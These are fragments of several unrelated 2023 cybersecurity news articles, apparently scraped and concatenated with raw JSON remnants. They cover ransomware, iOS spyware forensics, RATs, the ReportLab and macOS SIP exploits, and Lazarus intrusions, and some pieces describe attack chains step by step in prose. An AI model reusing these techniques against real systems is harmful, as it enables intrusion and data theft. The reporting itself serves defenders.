vulnerability.Customers who discovered their ESG appliances were compromised should stop using them and contact Barracuda support to obtain a new one, according to the company.Barracuda said none of its other products, including its SaaS email security services, were prone to the vulnerability.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": "  Ransomware group BlackCat (also known as ALPHV) has risen to prominence over the past 18 months and new research details how a retooling of its tradecraft earlier this year made it an even more powerful threat. The Russia-based group and its affiliates have attempted extortions around the world and across multiple industries, sometimes putting pressure on victims by publishing sensitive stolen data including financial and medical information.“Ransomware groups like BlackCat that are able to shift their tooling and tradecraft to make their operations faster and stealthier have a better chance of extending their lifespan,” IBM Security X-Force said in its post.“Sphynx differs from the previous variants in notable ways,” IBM Security X-Force’s analysis said.“For example, the command line arguments have been reworked. Previous variants utilized the –access-token parameter in order to execute. The updated ransomware removes that parameter and adds a set of more complex arguments. This makes it harder to detect since defenders do not have standard commands to hunt.”BlackCat switched to the Rust programming language in 2022, probably because it provided more opportunities to customize malware and hamper efforts to detect and analyze it, and the group’s affiliates continued to abuse the functionality of Group Policy Objects (GPO), both to deploy tools and to interfere with security measures, the researchers said.“Attackers displaying a nuanced understanding of Active Directory can abuse GPOs to great effect for swift mass malware deployment. For example, threat actors may attempt to increase the speed of their operations by changing default Group Policy refresh times, likely to shorten the window of time between changes taking effect and defenders being able to respond.”BlackCat attacks generally involved deploying tools for both data encryption and theft because the group usually ran a double extortion scheme.“X-Force observed attackers leveraging ExMatter, a .NET data exfiltration tool that was introduced in 2021 and received a substantial update in August 2022. ExMatter is exclusively used by one BlackCat ransomware affiliate cluster, tracked by Microsoft as DEV-0504,” the researchers said.“IBM X-Force has observed evidence that multiple terabytes of data had been exfiltrated from a victim environment to threat actor-controlled infrastructure. Stolen data is frequently posted publicly on the group’s official leak site in an attempt to apply pressure on extortion victims.”“Continuous advancements in BlackCat ransomware associated tradecraft, as well as the design of BlackCat and ExMatter malware, underscore adversary understanding of target systems and defender processes — as well as potential points where these can be leveraged for attacker advantage,” researchers wrote.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

The timestamps of the files, folders and the database records allow to roughly reconstruct the events happening to the device. The mvt-ios utility produces a sorted timeline of events into a file called “timeline.csv”, similar to a super-timeline used by conventional digital forensic tools.\nUsing this timeline, we were able to identify specific artifacts that indicate the compromise. This allowed to move the research forward, and to reconstruct the general infection sequence:The malicious toolset does not support persistence, most likely due to the limitations of the OS. The timelines of multiple devices indicate that they may be reinfected after rebooting. The oldest traces of infection that we discovered happened in 2019. As of the time of writing in June 2023, the attack is ongoing, and the most recent version of the devices successfully targeted is iOS 15.7.\nThe analysis of the final payload is not finished yet. The code is run with root privileges, implements a set of commands for collecting system and user information, and can run arbitrary code downloaded as plugin modules from the C&C server.It is important to note, that, although the malware includes portions of code dedicated specifically to clear the traces of compromise, it is possible to reliably identify if the device was compromised. Furthermore, if a new device was set up by migrating user data from an older device, the iTunes backup of that device will contain the traces of compromise that happened to both devices, with correct timestamps.All potential target devices must be backed up, either using iTunes, or an open-source utility idevicebackup2 (from the package libimobiledevice). The latter is shipped as a pre-built package with the most popular Linux distributions, or can be built from the source code for MacOS/Linux.\nTo create a backup with idevicebackup2, run the following command:\nidevicebackup2 backup --full $backup_directoryYou may need to enter the security code of the device several times, and the process may take several hours, depending on the amount of user data stored in it.Once the backup is ready, it has to be processed by the Mobile Verification Toolkit. If Python 3 is installed in the system, run the following command:\npip install mvtIf the owner of the device has set up encryption for the backup previously, the backup copy will be encrypted. In that case, the backup copy has to be decrypted before running the checks:\nmvt-ios decrypt-backup -d $decrypted_backup_directory $backup_directorymvt-ios check-backup -o $mvt_output_directory $decrypted_backup_directory\nThis command will run all the checks by MVT, and the output directory will contain several JSON and CSV files.

Required fields are marked *Name * Email * ΔBil iOS 16.x not affected?Securelist Hi Bil!We identified that the latest version of iOS that was targeted by Triangulation is 15.7. However, given the sophistication of the cyberespionage campaign and the complexity of analysis of iOS platform, we can’t guarantee that other versions of iOS are not affected.Sedric Louissaint Very well written! Thank you for sharing and being transparent!Jane Doe For clarity, this forensic examination is about the novel malware (the payload delivery mechanism could be Pegasus or Graphite) and not the built-in Apple backdoor as evident by the Wireshark dump and the supplied C&C domains. However, make no mistake about this, yes, the device manufacturer (Apple) could be compelled to work with the IC (intelligence community) and we would never know (network traffic could appear as routine Apple service). For now, on Apple’s merit, the device iCloud synchronization and back-ups are end-to-end encrypted (if enabled) without Apple having the key. The question is if there is mechanism to recover the one’s private key (e.g. similar to how the macOS FileVault FDE key could be “stored” with Apple for convenience).Waqas It’s unfortunate to see Kaspersky, a long-standing company, facing targeting from both the US and Russian intelligence agencies.JJ You state: “ Without any user interaction, the message triggers a vulnerability that leads to code execution.”\nIs this vulnerability reported to apple and what is their reaction. Interpreting your great report, a bug fix from apple and a reboot should fix the attack?Securelist Hi JJYes. We have shared information with the Apple Security Research team.As of time of writing we were able to identify one of many vulnerabilities that were exploited that is most likely CVE-2022-46690. This vulnerability was fixed in iOS 16.2. However, given the sophistication of the cyberespionage campaign and the complexity of analysis of the iOS platform, further research will surely reveal more details on the matter. We will update the community about new findings once they emerge.As to rebooting, Triangulation blocks the opportunity to update iOS which means that even if the device is rebooted it still has an opportunity to re-infect it. A factory reset combined with the immediate system update would solve the problem.Artur What about iOS 16.x is it not affected by „default” or via „Lockdown Mode” ? Securelist Hi Artur!Kaspersky cybersecurity experts identified that the latest version of iOS that was targeted by Triangulation is 15.7. However, given the sophistication of the cyberespionage campaign and the complexity of analysis of iOS platform, the further research may reveal more details on the matter. We will update the community about new findings once they emerge.Securelist Most probably, Lockdown Mode can help protecting against this attack.Timothy Avele Thank you for this thourough and in-depth analysis.

WAN interfaces are commonly found on devices such as routers, switches, and network appliances.It’s the latest in a series of bugs found in products from Taiwan-based Zyxel, which sells networking hardware and other services, typically to small- and medium-sized organizations.According to Rapid7, the current vulnerability exists in the default configuration of exploitable devices, and a device does not need to have a VPN configuration to be vulnerable. Successful exploitation of the bug allows hackers to execute malicious code remotely on the target system to install malware.Attacks against firewall devices are common. They have been carried out by both cyber-espionage and financially motivated groups.

Barracuda has also reached out to these specific customers.\"Several previously unknown malware strains were found during the investigation, specifically designed to be used on compromised Email Security Gateway products.The first, dubbed Saltwater, is a trojanized Barracuda SMTP daemon (bsmtpd) module that provides attackers backdoor access to infected appliances.Its \"features\" include the ability to execute commands on compromised devices, transfer files, and proxy/tunnel the attackers' malicious traffic to help evade detection.Another malware strain deployed during this campaign and dubbed SeaSpy provides persistence and can be activated using \"magic packets.\" SeaSpy helps monitor port 25 (SMTP) traffic, and some of its code overlaps with the publicly available cd00r passive backdoor.The threat actors also used a bsmtpd malicious module dubbed SeaSide to establish reverse shells via SMTP HELO/EHLO commands sent via the malware's command-and-control (C2) server.Barracuda says its products are used by over 200,000 organizations, including high-profile companies like Samsung, Delta Airlines, Mitsubishi, and Kraft Heinz."

      "text": "  A trojan module and several modifications of it were found distributed via Google Play that could potentially mean that millions of Android users are at risk of a cyberattack.Dubbed \"Android.Spy.SpinOk,\" Dr. Web reported that the module was designed to maintain the interest of users via mini-games, a systems of tasks, and various “prizes” and \"reward\" drawings. Once initialized, the malicious SDK connects to a command-and-control server by sending a request containing a large amount of technical information about the infected device. The trojan module ignores device proxy settings, which lets it hide network connections during a security team’s analysis.Dr. Web said the module then receives a list of URLs from the server, which it opens in WebView to display advertising banners. The trojan SDK then expands the capabilities of JavaScript code executed on loaded webpages containing ads. It adds many features to the code, including the ability to do the following: obtain the list of files in specified directories; verify the presence of a specified file or a directory on the device; obtain a file from the device; and copy or substitute the clipboard contents. For mobile app developers, SDKs are integrated to accomplish a specific known task, whether free or paid, said Krishna Vishnubhotla, vice president of product strategy at Zimperium. However, Vishnubhotla said people don’t always check what else the SDK can do, especially when it runs within an app on an end-user device.“Malicious actors don't make this simple, either, as most suspicious activity code is downloaded only when certain conditions are met on the device to avoid detection,” said Vishnubhotla. “So the SDK might look benign, for the most part, to a source-code scanner. If it’s a proprietary SDK, then you don't have access to the source code to begin with. Today's SDKs are sophisticated enough to evade standard detection mechanisms. Unseen threats are often the most dangerous. For mobile, we must go beyond the surface with the right mobile-focused tools that cover static and dynamic analysis.”Bud Broomhead, chief executive officer at Viakoo, added that the threat actors have burrowed deeply into a niche of Android games, those focused on allegedly making money for the player. Broomhead said it’s likely that they are focused on that niche for a reason: observing transfer of those funds to bank accounts or the likelihood that the threat actor will have specific files that attackers can further exploit.Broomhead pointed out that the 421 million-plus downloads figure doesn’t really match reality. He said if there are roughly 2 billion Android phones and tablets used around the world, and this spyware module has been installed 421 million times, that means roughly 1 out of 5 phones are impacted. “If estimates are that 25% of apps are downloaded once and never get used again are accurate, it’s still 316 million ‘active’ downloads,” said Broomhead. “Using Wi-Fi may offer some benefits in cases like this. The device traffic may be obscured by the app, but the local router and it’s firewall may offer some traceability and protection. Using multiple layers of network security can help to reduce significant data exfiltration incidents.”November 6, 2023The new PCI DSS standard puts more focus on application security, with more tools, testing and documentation required of developers.GitHub has updated its Advanced Security platform available for Enterprise Cloud and Enterprise Server customers to provide new artificial intelligence-powered features in a bid to \"revolutionize\" secure app development, reports SecurityWeek.Tue Aug 27 - Wed Aug 28Tue Dec 5On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " A researcher has published a working exploit for a remote code execution (RCE) flaw impacting ReportLab Toolkit, a popular Python library used by numerous projects to generate PDF files from HTML input.The problem stems from the ability to bypass sandbox restrictions on 'rl_safe_eval,' whose role is to prevent malicious code execution, leading to the attacker accessing potentially dangerous Python built-in functions.The 'rl_safe_eval' function was introduced as a measure to prevent a similar remote code execution issue that was discovered in 2019; hence the researcher focused on bypassing it.The presented PoC retrieves the built-in 'type' function that helps create a new class named 'Word,' which inherits from the 'str' class, which can bypass safety checks and give access to sensitive attributes like 'code.'Next, 'type' is called on itself to get around safe eval checks concerning argument count restrictions, allowing the attacker to abuse the original, built-in 'type' function for creating new classes and objects.This leads to constructing a malicious function from the bytecode of a compiled one, which, when executed, may perform an arbitrary action. In the researcher's example, it calls an OS command to create a file called 'exploited' in the \"/tmp/\" directory.The researcher notes that the entire exploit code must be run with eval in a single expression, so it uses the 'list comprehension' trick to structure it as such.The Cure53 researcher, Elyas Damej, warns in his write-up that the exploitation of CVE-2023-33733 is as simple as incorporating malicious code in an HTML file that will be converted to PDF on software that uses the ReportLab library.The widespread use of the library and a public exploit puts many users at risk. Software vendors using the library can address the resulting supply chain risk by applying the available security update.The researcher clarified that the vulnerability impacts all earlier versions of the library."

      "text": " A stealthy remote access trojan (RAT) named 'SeroXen' has recently gained popularity as cybercriminals begin using it for its low detection rates and powerful capabilities.AT&T reports that the malware is sold under the guise of a legitimate remote access tool for Windows 11 and 10 for $15/month or a single \"lifetime\" license payment of $60.However, the remote access program's low cost makes it very accessible to threat actors, with AT&T observing hundreds of samples since its creation in September 2022, with the activity ramping up recently.Most victims of SeroXen are in the gaming community, but as the popularity of the tool increases, the targeting scope could widen to include large companies and organizations.SeroXen is based on various open-source projects, including Quasar RAT, the r77 rootkit, and the NirCmd command line tool.\"The use of an elaborated open-source RAT like Quasar, with almost a decade since its first appearance, makes an advantageous foundation for the RAT […] while the combination of NirCMD and r77-rootkit are logical additions to the mix, since they make the tool more elusive and harder to detect.\" AT&T has seen attacks pushing SeroXen through phishing emails or Discord channels, where cybercriminals distribute ZIP archives that contain heavily obfuscated batch files.The batch file extracts two binaries from base64 encoded text and loads them into memory using .NET reflection.The only file that touches the disk is a modified version of msconfig.exe, which is needed for the malware execution, and is temporarily stored in the short-lived \"C:\\Windows \\System32\\\" (notice the extra space) directory that is deleted once the program is installed.This batch file ultimately deploys a payload named \"InstallStager.exe,\" a variant of the r77 rootkit.The rootkit is stored in an obfuscated form in the Windows registry and is later activated using PowerShell via the Task Scheduler, injecting it into \"winlogon.exe.\"The r77 rootkit injects the SeroXen RAT into the system's memory, ensuring it remains undetected and now providing remote access to the device.Once the remote access malware is launched, it establishes communication with the command and control server and waits for commands issued by the attackers.The analysts found that SeroXen uses the same TLS certificate as QuasarRAT and features most of the original project's capabilities, including TCP network stream support, efficient network serialization, and QuickLZ compression.AT&T fears that the growing popularity of SeroXen will attract hackers interested in targeting large organizations rather than focusing on gamers and has released indicators of compromise for use by network defenders."

It also allegedly neglected to implement basic privacy and security measures, allowing hackers to gain control of consumers' cameras and videos by breaching their accounts.\"In pursuit of rapid product development, before September 2017, Ring did not limit access to customers' video data to employees who needed the access to perform their job function (e.g., customer support, improvement of that product, etc.),\" the FTC's complaint reads.\"To the contrary, Ring gave every employee—as well as hundreds of Ukraine-based third-party contractors—full access to every customer video, regardless of whether the employee or contractor actually needed that access to perform his or her job function.\"It also highlights a specific instance where an Amazon employee viewed thousands of video recordings of female users in private spaces like bathrooms and bedrooms over several months. This incident went unnoticed by the company's security team until another employee discovered and reported it.FTC also points out that Ring failed to implement essential safeguards like multifactor authentication (MFA) until 2019, although aware of multiple credential-stuffing attacks that targeted its customers in 2017 and 2018.Furthermore, even after Ring added support for MDA, the inadequate implementation compromised their effectiveness.In a separate case, the FTC and the U.S. Department of Justice (DOJ) charged Amazon with violating children's privacy laws after failing to delete their voice recordings and geolocation information on their parents' requests.Under a proposed order, Amazon must pay $25 million and delete the children's data per their parents' requests.It will also prohibit Amazon from using children's data to train its algorithms and require deleting inactive child accounts and linked voice recordings and geolocation data.\"Finally, Amazon failed to delete users' voice information and geolocation information upon request and instead retained that data for its own potential use.\"Update: An Amazon spokesperson shared the following statement after the article was published:At Amazon, we take our responsibilities to our customers and their families very seriously. Our devices and services are built to protect customers’ privacy, and to provide customers with control over their experience. While we disagree with the FTC’s claims regarding both Alexa and Ring, and deny violating the law, these settlements put these matters behind us.We built Alexa with strong privacy protections and customer controls, designed Amazon Kids to comply with COPPA, and collaborated with the FTC before expanding Amazon Kids to include Alexa. As part of the settlement, we agreed to make a small modification to our already strong practices, and will remove child profiles that have been inactive for more than 18 months unless a parent or guardian chooses to keep them.Ring promptly addressed the issues at hand on its own years ago, well before the FTC began its inquiry. Our focus has been and remains on delivering products and features our customers love, while upholding our commitment to protect their privacy and security."

This strategy is further informed by Russia’s 2022 invasion of Ukraine, which has demonstrated how cyber capabilities may be used in large-scale conventional conflict.”The fact sheet includes a succinct summary of the global threat landscape. The Pentagon said it faced “an increasingly contested cyberspace” where its “pacing challenge” came from the People’s Republic of China. “The PRC has made significant investments in military cyber capabilities and empowered a number of proxy organizations to pursue malicious cyber activities against the United States.”Russian cyber activity posed “an acute threat,” it said, “evidenced by its malign influence efforts against the United States and repeated cyberattacks against Ukrainian civilian critical infrastructure”.It labeled North Korea, Iran, and extremist organizations as “persistent” threats and said dealing with transnational criminal organizations presented unique challenges “due to their technical aptitude and often close alignment with the foreign policy objectives of their host governments”.To address this multifaceted threat landscape, the cyber strategy outlined a four-pronged approach: defend the nation, prepare to fight and win wars, protect the cyber domain with allies and partners, and build enduring advantages in cyberspace.The DOD said its strategy for defending the nation would continue to include taking a “defend forward” approach focused on disrupting threat groups and the ecosystems that supported them. It said it would also work with partner agencies to ensure the cyber resilience of U.S. critical infrastructure and to counter threats to military readiness.The hunt forward initiative involves sending specialists overseas to work alongside other nations’ military and security agencies on hardening their local networks against cyber threats.Defense officials have previously said that as well as benefiting the partner states they are invited to assist, the missions also advantaged the U.S. by bolstering Cyber Command’s knowledge of the latest threats, providing intelligence that could assist in hardening domestic systems against attacks.Implementing the revised DOD cyber strategy will be a key responsibility for the next commander of Cyber Command and director of the National Security Agency.

      "text": " Apple has recently addressed a vulnerability that lets attackers with root privileges bypass System Integrity Protection (SIP) to install \"undeletable\" malware and access the victim's private data by circumventing Transparency, Consent, and Control (TCC) security checks.System Integrity Protection (SIP), also known as 'rootless,' is a macOS security mechanism that prevents potentially malicious software from altering certain folders and files by imposing restrictions on the root user account and its capabilities within protected areas of the operating system.SIP operates under the principle that only processes signed by Apple or those possessing special entitlements, such as Apple software updates and installers, should be authorized to alter macOS-protected components.It's also important to note that there's no method to disable SIP without restarting the system and booting off of macOS Recovery (the built-in recovery system)—which requires having physical access to an already compromised device.However, Microsoft's researchers found that attackers with root permissions could bypass SIP security enforcement by abusing the macOS Migration Assistant utility, a built-in macOS app that uses the systemmigrationd daemon with SIP-bypassing capabilities stemming from its com.apple.rootless.install.heritable entitlement.The researchers demonstrated that attackers with root permissions could automate the migration process with AppleScript and launch a malicious payload after adding it to SIP's exclusions list without restarting the system and booting from macOS Recovery.Arbitrary SIP bypasses come with significant risks, especially when exploited by malware creators, as it enables malicious code to have far-reaching effects, including creating SIP-protected malware that can't be removed via standard deletion methods.They also greatly expand the attack surface and could allow attackers to tamper with system integrity through arbitrary kernel code execution and potentially install rootkits to hide malicious processes and files from security software.Bypassing SIP protection also enables a complete bypass of Transparency, Consent, and Control (TCC) policies, enabling threat actors to replace TCC databases and gaining granting unrestricted access to the victim's private data."

Clicking the link in the fake HR communication results in a login prompt overlaying the victim’s corporate home page, which was detected and automatically generated from their email address in the URL.This approach is characterized by the blending of two effective phishing tactics: spoofed HR communications and a travel-themed phishing hook.The attack leverages the regular HR procedures associated with vacation requests and taps into the anticipation and excitement surrounding the summer travel season, the researchers noted in the report.\"This is a sophisticated credential harvesting tactic,\" explains Mika Aalto, co-founder and CEO at Hoxhunt. \"Trust is essential to social engineering and while many would sense something is off about the poorly worded email message, others might be disarmed by it.\"He notes these dual streams of familiarity could heighten trust and move the victim further down the kill chain.\"The more sophisticated and authentic the spoofed website appears, the higher the chances of successful deception,\" Aalto says. \"It's almost like a decoy — the poorly composed email may lead the potential victims to underestimate the threat, thus lowering their guard when they arrive at a surprisingly genuine-looking site.\"He adds that attackers are not just relying on email anymore but are also using social media platforms, text messages, and even phone calls to reach potential victims.\"Looking forward, we can expect these scams to continue to evolve in complexity, possibly incorporating artificial intelligence to make their phishing attempts more convincing,\" he says.\"AI chatbots can interact with unwitting victims as convincingly as a human being to steal valuable credentials, and deepfake platforms enable criminals to pose as trusted figures,\" Aalto warns.Patrick Harr, CEO at SlashNext, points out there are many variations of this threat that could succeed in organizations and lead to a breach.Harr explains that hackers are taking advantage of travel companies that are trying to make travel frictionless for their guest with apps and text messaging.\"Threats are growing because of the increased use of apps and text messages from airlines, hotels, transportation, and other travel activities,\" he says.He says the most notable evolution of travel-based scams is the transition from email and Web-based threats to mobile app threats and threats on social media.He points out hackers are taking advantage of travelers because they are more likely to interact with unfamiliar text messages or apps, connect to unfamiliar Wi-Fi, and look for VPNs to stream content.\"Do not connect to unfamiliar networks, and when unsure about the safety of Wi-Fi, use cellular data,\" he cautions. \"Do not download free VPNs or free streaming services. Don't connect to airport Wi-Fi or connect your phone to free charging stations.\"Common phishing campaigns targeting travelers often involve discounted or free flights, hotel bookings, or package deals that are simply too good to be true.\"All these attacks will be particularly hard to resist for bargain hunters this travel season, which will be unusually expensive due to inflated travel, food, and lodging prices,\" Aalto says.Most scams will either result in a direct payment of hundreds or thousands of dollars to a fraudulent site, or a credential-harvesting scam that captures and sells or otherwise uses sensitive data.\"Remember, there’s a multibillion-dollar organized cybercrime industry thriving on the Dark Web, where stolen data is a commodity that contains significant value,\" he says. \"Corporate accounts are gateways to corporate systems.\"There are also scams involving fake vacation rentals or timeshares, false travel insurance, and even scams where criminals pose as government officials to offer expedited visa or passport services.\"In a more sophisticated approach,\" Aalto adds, \"we're seeing scams involving fraudulent loyalty program emails or notifications designed to trick customers into divulging their personal information or login credentials.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Undetected Attacks Against Middle East Targets Conducted Since 2020",
      "text": " Businesses in the Middle East faced a series of targeted attacks over the past few years, with an open source tool used by threat actors as a kernel driver.Fortinet researchers Geri Revay and Hossein Jazi said in a post on their research that they believe this driver has been active in the wild since at least mid-2020, not reported until now, and used over the past few years in several campaigns.One sample the Fortinet researchers captured was uploaded to Virus Total in February 2023, but had been compiled in May 2020. Another variant of this driver with the same name was compiled around that time as well but was uploaded to Virus Total in September 2022.Fortinet's telemetry shows a noticeable increase in the number of lookups — or spikes in activity — for this driver in August and September 2022, and again in February and March 2023. This may indicate that the threat actor behind the driver was operating major campaigns on these dates. In fact, 65% of the lookups for the driver were from Saudi Arabia, indicating it was a primary target, according to the research.Jazi confirms that other malware families using similar attack vectors (i.e., kernel drivers) have been observed, but this was a detection of a new malicious driver.\"It has new functionalities such as targeting IIS [Internet Information Services] servers, which is unique in its own accord,\" Jazi says.While Jazi is unable to share further details on specific verticals that were targeted, he notes that there is a long history of Iranian threat groups targeting Saudi Arabia and other nations in the region.Fortinet researchers say it's unclear how the driver was distributed, and they don't they know who was behind this operation. \"Observed telemetry shows that while this driver has primarily targeted at Saudi Arabia, it has also been detected in Jordan, Qatar, and the United Arab Emirates, which are the classic targets of Iranian threat actors,\" the report said.Iranian threat actors have been known to exploit Microsoft Exchange Servers to deploy additional malware, so it is possible that this driver has been employed alongside Exchange attacks. \"To that point, the compilation time of the drivers is also aligned with times when Iranian threat actors were exploiting Exchange server vulnerabilities,\" the researchers wrote.Asked if he believes the time spent undetected was indicative of the sophistication of an attacker, Walsh says an attacker's sophistication is based on a myriad of factors and also depends on the objectives of a campaign.Walsh notes that open source tools are more likely to be detected, as the security community knows of them and countermeasures and remediation techniques have been developed to counteract them.\"Custom tooling is much more difficult to detect as automated systems have little, if any, information about the tool to use as part of their detection mechanisms,\" he says. \"Attackers do sometimes adopt an approach of using tools already on target systems or within target networks.\"\"Living-off-the-land allows for stealth as there is no execution of any suspicious programs or scripts, which would trigger an alert,\" Walsh says. \"The attackers instead use tools built into operating systems, which are less likely to trigger an alert, or even be deemed suspicious.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Jimbos Protocol, an Arbitrum-based DeFi project, has suffered a flash loan attack that resulted in the loss of more than of 4000 ETH tokens, currently valued at over $7,500,000.The company disclosed the attack on Twitter yesterday, saying that law enforcement have been notified and it is working with security professionals to remediate the situation.Flash loans are actions where users borrow a large amount of tokens and are expected to pay them back in the same transaction (immediately).If the attacker exploits a flaw in the DeFi platform or they manipulate the price of the token during that very short period between receiving the amount and paying it back, they can keep the difference at the cost of the lender.In the case of Jimbos Protocol, the attacker took a $5.9 million flash loan, manipulated the market to skew the price range, traded back the tokens, and escaped with 4,090 ETH.Slippage control is a measure that restricts token price changes to ensure that their fluctuation stays within an acceptable range from the time of initiating a trade to its completion, in this case, a flash loan.However, Jimbo V2 was purportedly designed to rectify slippage and other obvious security issues. As such, it was projected as a more dependable investment opportunity, at least for a brief three-day period."

It has also contacted law enforcement authorities to help prevent the misuse of the stolen information.Additionally, the notices sent to impacted individuals enclose instructions on receiving 12 months of free identity theft protection and credit monitoring service through IDX.On that notice, people may also find the extensive list of over a hundred healthcare providers indirectly impacted by this incident. However, it is unclear if those entities will publish separate notices of the breach.The LockBit ransomware gang claimed the cyberattack on MCNA on March 7th, 2023, when the group published the first data samples stolen from the healthcare provider.LockBit threatened to publish 700GB of sensitive, confidential information they allegedly exfiltrated from MCNA’s networks unless they were paid $10 million.On April 7th, 2023, LockBit released all data on its website, making it available for download by anyone.As the data is likely in the hands of other threat actors, all impacted users must monitor their credit reports for fraudulent activity and signs of identity theft.Furthermore, users should be careful of targeted phishing emails that use the leaked data to trick recipients into revealing further sensitive information, such as credentials."

      "text": " The notorious North Korean state-backed hackers, known as the Lazarus Group, are now targeting vulnerable Windows Internet Information Services (IIS) web servers to gain initial access to corporate networks.Lazarus is primarily financially motivated, with many analysts believing that the hackers' malicious activities help fund North Korea's weapons development programs. However, the group has also been involved in several espionage operations.Windows Internet Information Services (IIS) web servers are used by organizations of all sizes for hosting web content like sites, apps, and services, such as Microsoft Exchange's Outlook on the Web.It is a flexible solution that has been available since the launch of Windows NT, supporting the HTTP, HTTPS, FTP, FTPS, SMTP, and NNTP protocols.However, if the servers are poorly managed or outdated, they can act as network entry points for hackers.Lazarus first gains access to IIS servers using known vulnerabilities or misconfigurations that allow the threat actors to create files on the IIS server using the w3wp.exe process.The hackers drop 'Wordconv.exe,' a legitimate file that is part of Microsoft Office, a malicious DLL ('msvcr100.dll') in the same folder, and an encoded file named 'msvcr100.dat.'Upon launching 'Wordconv.exe,' the malicious code in the DLL loads to decrypt the Salsa20-encoded executable from msvcr100.dat and execute it in memory where antivirus tools can't detect it.Hence, ASEC considers the newly discovered DLL file a new variant of the same malware.In the second phase of the attack, Lazarus creates a second malware ('diagn.dll') by exploiting a Notepad++ plugin.That second malware receives a new payload encoded with the RC6 algorithm this time, decrypts it using a hard-coded key, and executes it in memory for evasion.ASEC could not determine what this payload did on the breached system, but it saw signs of LSASS dumping pointing to credential theft activity.The final step of the Lazarus attack was to perform network reconnaissance and lateral movement through port 3389 (Remote Desktop) using valid user credentials, presumably stolen in the previous step.However, ASEC has not uncovered any further malicious activities after the attackers spread laterally on the network.As Lazarus is relying heavily on DLL sideloading as part of their attacks, ASEC recommends that organizations monitor for abnormal process execution.\"In particular, since the threat group primarily utilizes the DLL side-loading technique during their initial infiltrations, companies should proactively monitor abnormal process execution relationships and take preemptive measures to prevent the threat group from carrying out activities such as information exfiltration and lateral movement,\" concludes ASEC's report."

      "text": "  Matt Muir, threat intelligence researcher at Cado Security, explained that if the attackers are successful and dependent on the permissions granted to the entity in which the exfiltrated credentials are attached to, it could allow unauthorized access to AWS services and the AWS console.“This could result in data theft, the account being used to deploy additional resources, or the account's resources being used in mass spamming campaigns,” said Muir. “Naturally, this would be a serious situation for any cloud security professional to deal with.” Muir said based on the Telegram distribution Cado Security researchers covered in its last blog on Legion, they believe this malware was developed by an individual in Indonesia. Muir said the malware has been developed with the intention to sell it to other attackers with a desire to exploit cloud services for spamming purposes.“Legion is highly opportunistic and, from the samples we've analyzed, doesn't appear to target specific industries,” said Muir. “It targets specific [cloud] misconfigurations and uses credentials retrieved from this process to gain unauthorized access to cloud and SMTP services.”Legion's latest updates, especially its targeting of AWS CloudWatch, represent a concerning evolution in the capabilities of this hacking tool, said Ani Chaudhuri, chief executive officer at Dasera. Chaudhuri said this development signifies a broadening of the cybercriminal’s scope: they are leveraging misconfigured web servers to steal credentials and expanding their reach to manipulate cloud services.Chaudhuri explained that AWS CloudWatch operates as a monitoring service for cloud resources and applications. If hackers gain unauthorized access to it, they can interfere with operational insights, potentially leading to significant disruptions or even breaches.“Security professionals should pay close attention to these developments,” said Chaudhuri. “As the digital landscape becomes increasingly complex, the threats we face evolve. The shift towards exploiting cloud services is particularly alarming, considering the rapid growth of businesses relying on cloud technologies for their operations. Unauthorized access to an organization's AWS CloudWatch could lead to disruption of services, theft of sensitive data, and a compromise of the overall security posture. This could result in financial losses, damaged reputation, and regulatory penalties.”Joseph Carson, chief security scientist and Advisory CISO at Delinea, added that as organizations move legacy applications and systems to cloud infrastructure, they still struggle with misconfigurations exposing cloud environments, making them easy targets for cybercriminals. “Identities and credentials are a top target, and when attackers find a common misconfiguration that many organizations repeat, it’s only a matter of time before they automate the discovery,” said Carson. “This is exactly what has happened with the recent updates to the cloud credentials harvesting tool known as Legion. Cloud has become even more popular for attackers looking for ways to exploit user identities and credentials, allowing them to find more ways to obtain unauthorized access to victims networks. It must be a top priority for organizations to be proactive and discover these misconfigurations before the attackers do.”U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Transitioning to cloud-native environments has brought along security risks for companies, according to TechRadar.Vulnerabilities in API authorization have been named by Wallarm as the second greatest security risk facing APIs, emphasizing the ease of leveraging authorizations as backdoors as well as the urgent need to ensure authorization maintenance, reports SiliconAngle.Tue Apr 23Wed Dec 6On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

In the wake of the upheaval of the Supreme Court overturning Roe v. Wade, the company said it would delete this data. Another report showed the company failed to delete sensitive location data in about 60% of tested cases. As privacy stakeholders have warned, this data could reveal personal healthcare decisions and the creation of user identities by third parties that could allow for highly targeted advertising of sensitive conditions.“Over 10 months after this announcement, reporters for the Washington Post visited hospitals, fertility clinics, and Planned Parenthood clinics in multiple states and found instances where Google stored the exact name and address of the location visited, e.g. Planned Parenthood — San Francisco Health Center,’\" the senators wrote to CEO Sundar Pichai.“Claiming and publicly announcing that Google will delete sensitive location data, without consistently doing so, could be considered a deceptive practice,” they continued.The senators are asking Google to share how it identifies whether a user has visited a sensitive location and provide a “complete list of metadata” and other supporting documents used by the company to make the identification. Google is also asked to provide a full list of the types of locations the company considers to be sensitive, “and thus eligible to be automatically deleted.”The inquiry also questions how long Google waits to delete the deemed sensitive location entry after a visit, as well as insights into its targeted advertising policies, particularly campaigns that could reveal users’ health data.Senators are giving Pichai until the end of the week to respond to its inquiry and asked that it agree to a third-party audit to verify the company has successfully implemented a protocol to delete users’ location data.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.TechCrunch reports that two-factor authentication has been required by major U.S. genetic testing and genealogy firms 23andMe, Ancestry, and MyHeritage in the aftermath of the significant 23andMe breach, which resulted in the 